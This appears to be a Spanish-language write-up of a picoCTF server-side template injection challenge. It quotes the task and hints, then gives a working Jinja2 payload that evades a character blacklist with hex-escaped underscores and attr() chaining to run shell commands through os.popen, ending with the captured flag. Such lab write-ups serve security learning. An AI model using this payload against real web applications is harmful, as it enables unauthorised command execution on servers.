# Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:51768/)!
Hints:
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?
# Solución
- Abriremos la página que nos dan
- Al igual que en el 1 buscaremos en una página para encontrar una inyección y usarla
- Intentamos con multiples inyecciones y nos aparece un mensaje que dice "para de tratar de romperme"
- Hasta que encontramos la inyección correcta
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
- Ahora si nos da los ID´s
- Cambiamos el id por un cat flag y obtendremos la bandera
```
# picoCTF{sst1_f1lt3r_byp4ss_ece726e9}
```
# Notas adicionales
# Referencias